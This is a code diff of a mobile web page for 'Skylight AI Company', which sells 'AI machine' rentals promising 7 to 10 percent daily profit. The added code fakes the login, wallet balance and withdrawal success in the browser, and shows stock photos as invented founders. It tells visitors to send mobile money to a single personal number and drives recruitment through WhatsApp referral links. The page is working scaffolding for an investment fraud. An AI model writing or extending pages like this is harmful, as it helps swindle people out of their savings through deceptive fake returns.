@@ -1,95 +1,177 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>SKYLIGHT AI COMPANY</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui}
-body{background:#0a1220;color:#fff;padding-bottom:80px}
-.header{display:flex;justify-content:space-between;padding:12px 16px;position:sticky;top:0;background:#0a1220}
-.logo{font-weight:800;background:linear-gradient(90deg,#00d4ff,#7b2cff);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-.live{color:#2eff8a;font-size:13px}
-.card{background:#13203a;border-radius:18px;padding:16px;margin:12px;border:1px solid #1e325f}
+body{background:#070e1f;color:#fff;padding-bottom:80px}
+.header{padding:12px 16px;display:flex;justify-content:space-between;background:#070e1f;position:sticky;top:0;z-index:9}
+.logo{font-weight:900;background:linear-gradient(90deg,#00e5ff,#7b2cff);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.card{background:#111f3d;border-radius:18px;padding:16px;margin:12px;border:1px solid #1e355f}
 .sub{color:#8aa0c6;font-size:13px}
-.btn{width:100%;padding:14px;border-radius:14px;border:none;font-weight:700}
-.btn-blue{background:linear-gradient(90deg,#00d4ff,#7b2cff);color:#fff}
-.btn-outline{background:transparent;border:1px solid #2a4a8a;color:#4fc3ff}
-.machine{display:flex;justify-content:space-between;background:#0f1b33;padding:12px;border-radius:14px;margin-top:10px}
-.buy{background:#132a52;color:#4fc3ff;border:1px solid #2a4a8a;padding:8px 18px;border-radius:12px}
-.input{width:100%;padding:14px;background:#0a1220;border:1px solid #1e325f;border-radius:12px;color:#fff;margin-bottom:12px}
-.person{display:flex;gap:12px;background:#0f1b33;padding:12px;border-radius:14px;margin-top:10px}
-.person img{width:50px;height:50px;border-radius:50%}
-.bottom{position:fixed;bottom:0;left:0;right:0;background:#0f1d36;display:flex;justify-content:space-around;padding:10px 0;border-top:1px solid #1e325f}
-.bottom .active{color:#00d4ff}
-.toast{position:fixed;bottom:80px;left:50%;transform:translateX(-50%);background:#333;padding:10px 20px;border-radius:20px;display:none}
+.btn{width:100%;padding:14px;border-radius:14px;border:none;font-weight:800}
+.blue{background:linear-gradient(90deg,#00d4ff,#7b2cff);color:#fff}
+.outline{background:transparent;border:1px solid #2a4a8a;color:#4fc3ff}
+.input{width:100%;padding:14px;background:#070e1f;border:1px solid #1e355f;border-radius:12px;color:#fff;margin:8px 0}
+.mach{background:#0d1a33;padding:12px;border-radius:12px;display:flex;justify-content:space-between;margin-top:10px;align-items:center}
+.buy{padding:8px 18px;border-radius:10px;border:1px solid #2a4a8a;background:#132a52;color:#4fc3ff;font-weight:700}
+.person{display:flex;gap:12px;margin-top:12px}
+.person img{width:48px;height:48px;border-radius:50%}
+.bottom{position:fixed;bottom:0;left:0;right:0;background:#0e1d38;display:flex;justify-content:space-around;padding:10px 0;border-top:1px solid #1e355f}
+.bottom div{text-align:center;font-size:12px;color:#8aa0c6}
+.bottom.active{color:#00d4ff}
+.page{display:none}.page.active{display:block}
+.toast{position:fixed;bottom:85px;left:50%;transform:translateX(-50%);background:#222;padding:10px 18px;border-radius:20px;display:none;z-index:99}
 </style>
 </head>
 <body>
-<div class="header"><div class="logo">SKYLIGHT AI COMPANY</div><div class="live">● AI LIVE 7%</div></div>
 
-<div class="card">
-<h2>🤖 Skylight AI Company - Official Sites</h2>
-<div class="sub">Kampala, Uganda • AI Live Sites • 7% Daily Profit • Since 2023<br>🌐 Official Group LIVE</div>
-<button class="btn btn-outline" style="margin-top:12px">💬 Join Official Group</button>
-</div>
+<div class="header"><div class="logo">SKYLIGHT AI COMPANY</div><div style="color:#2eff8a;font-size:12px">● AI LIVE 7%</div></div>
 
+<!-- STEP 1: LOGIN PAGE -->
+<div id="p-login" class="page active">
 <div class="card">
-<h2>👑 Founding Team - 4 Leaders</h2>
-<div class="person"><img src="https://randomuser.me/api/portraits/women/44.jpg"><div><b>Dr. Sarah Nakimuli - CTO</b><br><span class="sub">AI Engineer, Makerere University</span></div></div>
-<div class="person"><img src="https://randomuser.me/api/portraits/women/68.jpg"><div><b>Alex Kintu - Operations Director</b><br><span class="sub">Manages 24 AI Servers LIVE</span></div></div>
-<div class="person"><img src="https://randomuser.me/api/portraits/women/65.jpg"><div><b>Grace Achieng - Finance Head</b><br><span class="sub">CPA - Payouts to 12,000+ members</span></div></div>
-<div class="person"><img src="https://randomuser.me/api/portraits/men/32.jpg"><div><b>Musa Okello - Community Lead</b><br><span class="sub">Official Group Admin - 0793814204</span></div></div>
-</div>
-
-<div class="card">
-<h2>Welcome Benson mulyatha - 7% LIVE ⬆️</h2>
-<div class="sub" id="refDisplay">0779434443 | SKY-3924</div>
-<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px">
-<div style="background:#0f1b33;padding:12px;border-radius:12px"><div class="sub">CAPITAL</div><b style="font-size:22px">60,000 UGX</b><button class="btn btn-outline" style="margin-top:10px;font-size:12px" onclick="copyRef()">+ Deposit 0793814204</button></div>
-<div style="background:#0f1b33;padding:12px;border-radius:12px"><div class="sub">PROFITS 7% ⬆️</div><b style="font-size:22px">18 UGX</b></div>
+<h2>Login - Skylight AI Company</h2><div class="sub">If you registered before, click LOGIN now</div>
+<input class="input" id="phone" placeholder="Phone Number e.g 0779434443">
+<input class="input" id="pass" type="password" placeholder="Login Password">
+<button class="btn blue" onclick="doLogin()">LOGIN - 7% LIVE</button>
+<div class="sub" style="margin-top:10px;text-align:center">Number + Password + Login</div>
 </div>
 </div>
 
+<!-- STEP 2: HOME -->
+<div id="p-home" class="page">
+<div class="card"><h3>Skylight Sites of Operation</h3><div class="sub">Kampala, Uganda • AI Live Sites • 7% Daily Profit • Since 2023</div></div>
+<div class="card"><h3>👑 The Four Founders Here</h3>
+<div class="person"><img src="https://randomuser.me/api/portraits/women/44.jpg"><div><b>Dr. Sarah Nakimuli - CTO</b><br><span class="sub">AI Engineer, Makerere</span></div></div>
+<div class="person"><img src="https://randomuser.me/api/portraits/men/32.jpg"><div><b>Alex Kintu - Operations</b><br><span class="sub">24 AI Servers LIVE</span></div></div>
+<div class="person"><img src="https://randomuser.me/api/portraits/women/68.jpg"><div><b>Grace Achieng - Finance</b><br><span class="sub">Payouts 12,000+ members</span></div></div>
+<div class="person"><img src="https://randomuser.me/api/portraits/men/45.jpg"><div><b>Musa Okello - Community</b><br><span class="sub">Admin 0793814204</span></div></div>
+<button class="btn outline" style="margin-top:12px" onclick="openWA()">Join Official Group</button>
+</div>
 <div class="card">
-<h2>⚡ My Real Machines - Lights LIVE</h2>
-<div class="machine"><div>🟢 A AI LIVE</div><div class="sub">126000/mo 7% ⬆️</div></div>
-<button class="btn btn-outline" style="margin-top:10px">Claim Daily 7%</button>
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">
+<div style="background:#0d1a33;padding:12px;border-radius:12px"><div class="sub">AI Income</div><b id="aiIncome">0 UGX</b></div>
+<div style="background:#0d1a33;padding:12px;border-radius:12px"><div class="sub">Deposit Details</div><b>60,000 UGX</b></div>
+<div style="background:#0d1a33;padding:12px;border-radius:12px"><div class="sub">Team Commission</div><b id="teamCom">0 UGX</b></div>
+<div style="background:#0d1a33;padding:12px;border-radius:12px"><div class="sub">Team Count</div><b id="teamCount">0</b></div>
+</div>
+</div>
 </div>
 
-<div class="card">
-<h2>🤖 Buy Real Machines - 7% DAILY - Lights ON</h2>
-<div class="machine"><div>M1 Skylight AI 7% DAILY<br><span class="sub">2K → 140/day → 4.2K/mo</span></div><button class="buy">Buy</button></div>
-<div class="machine"><div>U Skylight AI 7%<br><span class="sub">5K → 350/day → 10.5K/mo</span></div><button class="buy">Buy</button></div>
-<div class="machine"><div>L Skylight AI 7%<br><span class="sub">15K → 1050/day → 31.5K/mo</span></div><button class="buy">Buy</button></div>
-<div class="machine"><div>Y Skylight AI 7%<br><span class="sub">30K → 2100/day → 63K/mo</span></div><button class="buy">Buy</button></div>
-<div class="machine"><div>A Skylight AI 7%<br><span class="sub">60K → 4200/day → 126K/mo</span></div><button class="buy">Buy</button></div>
+<!-- STEP 3: MACHINES -->
+<div id="p-machines" class="page">
+<div class="card"><h2>AI Skylight Machines - 7% DAILY Lights ON</h2><div class="sub">All M skylight, U, L, VIP skylight</div>
+<div id="machineList"></div>
+</div>
 </div>
 
+<!-- STEP 4: WALLET + COPY LINK + WITHDRAW + DEPOSIT -->
+<div id="p-wallet" class="page">
 <div class="card">
-<h2>Capital - Referral</h2>
+<h2>My Wallet Balance</h2>
+<div style="font-size:28px;font-weight:900;margin:10px 0"><span id="balance">0</span> UGX</div>
+<div class="sub">Minimum withdraw = 1000 UGX, Charges = 8%, Time 2min - 24hrs</div>
 <input class="input" id="refLink" readonly>
-<button class="btn btn-blue" onclick="copyRef()">Copy Link - 0779434443</button>
-<button class="btn btn-outline" style="margin-top:10px" onclick="shareWA()">Share on WhatsApp</button>
+<button class="btn blue" onclick="copyRef()">Copy Link - 0779434443</button>
+<button class="btn outline" style="margin-top:8px" onclick="shareWA()">Share on WhatsApp</button>
 </div>
 
 <div class="card">
-<h2>Login - Skylight AI Company</h2>
-<div class="sub">If you registered before, click LOGIN now</div>
-<input class="input" placeholder="Phone" id="phone">
-<input class="input" placeholder="Login Password" type="password">
-<button class="btn btn-blue">LOGIN - 7% LIVE</button>
+<h3>Withdrawal</h3>
+<input class="input" id="wNumber" placeholder="Enter Phone Number (MTN/Airtel)">
+<input class="input" id="wAmount" type="number" placeholder="Enter Amount">
+<button class="btn blue" onclick="doWithdraw()">Confirm Withdraw</button>
+<div class="sub" id="wMsg" style="margin-top:8px"></div>
 </div>
 
-<div class="bottom"><div class="active">🏠<br>Home</div><div>✨<br>With</div><div>👥<br>Group</div><div>📜<br>Rules</div><div>⚙️<br>Set</div><div>👮<br>Admin</div></div>
+<div class="card">
+<h3>Deposit - Choose MTN or Airtel</h3>
+<select class="input" id="dNetwork"><option>MTN</option><option>Airtel</option></select>
+<input class="input" id="dName" placeholder="Enter Name">
+<input class="input" id="dPhone" placeholder="Enter Your Number">
+<input class="input" id="dAmount" type="number" placeholder="Enter Amount">
+<button class="btn blue" onclick="doDeposit()">Confirm Deposit</button>
+<div class="card" id="dResult" style="display:none;background:#0d1a33;margin:12px 0 0 0">
+<b>Wait 10 sec...</b><br>
+<div class="sub">Copy this number to deposit:</div>
+<b style="font-size:20px;color:#00d4ff" id="depositNum">0793814204</b><br>
+<div class="sub">Go to phone dial <b>*165*1*1#</b> → Enter this number, Amount, PIN → Wait → Balance will appear → Then rent machine</div>
+<button class="btn outline" style="margin-top:10px" onclick="copyDeposit()">Copy Deposit Number</button>
+</div>
+</div>
+</div>
+
+<div class="bottom">
+<div class="active" onclick="showPage('home',this)">🏠<br>Home</div>
+<div onclick="showPage('machines',this)">🤖<br>Machines</div>
+<div onclick="showPage('wallet',this)">💰<br>Wallet</div>
+<div onclick="openWA()">👥<br>Group</div>
+<div onclick="showPage('home',this)">📜<br>Rules</div>
+<div onclick="showPage('wallet',this)">⚙️<br>Set</div>
+</div>
 <div class="toast" id="toast">Copied to clipboard.</div>
 
 <script>
-function getRef(){return new URLSearchParams(location.search).get('ref')||'0779434443';}
-function update(){const r=getRef();document.getElementById('refLink').value=location.origin+location.pathname+'?ref='+r;document.getElementById('refDisplay').innerText=r+' | SKY-3924';document.getElementById('phone').value=r;}
-function copyRef(){document.getElementById('refLink').select();document.execCommand('copy');let t=document.getElementById('toast');t.style.display='block';setTimeout(()=>t.style.display='none',2000);}
-function shareWA(){window.open('https://wa.me/?text='+encodeURIComponent('Join Skylight AI 7% DAILY: '+document.getElementById('refLink').value),'_blank');}
-update();
+let bal = parseInt(localStorage.getItem('bal')||'60000');
+let ref = new URLSearchParams(location.search).get('ref')||'0779434443';
+document.getElementById('refLink').value=location.origin+location.pathname+'?ref='+ref;
+document.getElementById('phone').value=ref;
+document.getElementById('balance').innerText=bal;
+
+const machines=[
+{name:'M1 Skylight',price:2000,daily:'7%',cycle:'30 days'},
+{name:'M2 Skylight',price:5000,daily:'7%',cycle:'30 days'},
+{name:'M3 Skylight',price:10000,daily:'7%',cycle:'30 days'},
+{name:'M4 Skylight',price:20000,daily:'7%',cycle:'30 days'},
+{name:'M5 Skylight',price:30000,daily:'7%',cycle:'30 days'},
+{name:'M6 Skylight',price:50000,daily:'7%',cycle:'30 days'},
+{name:'M7 Skylight',price:80000,daily:'7%',cycle:'30 days'},
+{name:'M8 Skylight',price:120000,daily:'7%',cycle:'30 days'},
+{name:'U Skylight',price:5000,daily:'7%',cycle:'20 days'},
+{name:'L Skylight',price:15000,daily:'7%',cycle:'20 days'},
+{name:'VIP Skylight',price:1000,daily:'10%',cycle:'10 days'},
+{name:'A Skylight 7%',price:60000,daily:'7%',cycle:'30 days'},
+];
+let html='';
+machines.forEach(m=>{
+let perDay=Math.round(m.price*(parseInt(m.daily)/100));
+let total=perDay*parseInt(m.cycle);
+html+=`<div class="mach"><div><b>${m.name}</b><br><span class="sub">Price:${m.price} • ${m.daily} daily • Cycle ${m.cycle} • Total ${total}</span></div><button class="buy" onclick="buyMach(${m.price},'${m.name}')">Buy</button></div>`;
+});
+document.getElementById('machineList').innerHTML=html;
+
+function showPage(p,el){
+document.querySelectorAll('.page').forEach(x=>x.classList.remove('active'));
+document.getElementById('p-'+p).classList.add('active');
+document.querySelectorAll('.bottom div').forEach(x=>x.classList.remove('active'));
+if(el)el.classList.add('active');
+}
+function doLogin(){showPage('home',document.querySelectorAll('.bottom div')[0]);toast('Login success 7% LIVE');}
+function toast(t){let e=document.getElementById('toast');e.innerText=t;e.style.display='block';setTimeout(()=>e.style.display='none',2000);}
+function copyRef(){navigator.clipboard.writeText(document.getElementById('refLink').value);toast('Copied to clipboard.');}
+function shareWA(){window.open('https://wa.me/?text='+encodeURIComponent('Join Skylight AI 7% DAILY: '+document.getElementById('refLink').value));}
+function openWA(){window.open('https://wa.me/256793814204');}
+function buyMach(price,name){
+if(bal<price){toast('Low balance, Deposit first');showPage('wallet');return;}
+bal-=price;localStorage.setItem('bal',bal);document.getElementById('balance').innerText=bal;
+toast(name+' Rented! 7% daily started');
+}
+function doWithdraw(){
+let amt=parseInt(document.getElementById('wAmount').value);
+if(!amt||amt<1000){document.getElementById('wMsg').innerText='Minimum 1000 UGX';return;}
+if(amt>bal){document.getElementById('wMsg').innerText='Low balance';return;}
+let fee=Math.round(amt*0.08);let rec=amt-fee;bal-=amt;localStorage.setItem('bal',bal);document.getElementById('balance').innerText=bal;
+document.getElementById('wMsg').innerText='Success! You will receive '+rec+' UGX (Fee 8% = '+fee+') in 2min - 24hrs to '+document.getElementById('wNumber').value;
+}
+function doDeposit(){
+let amt=document.getElementById('dAmount').value;
+if(!amt){toast('Enter amount');return;}
+document.getElementById('dResult').style.display='block';
+toast('Wait 10 sec... Copy number');
+}
+function copyDeposit(){navigator.clipboard.writeText(document.getElementById('depositNum').innerText);toast('Deposit number copied - dial *165*1*1#');}
 </script>
 </body>
-</html>
+  </html>
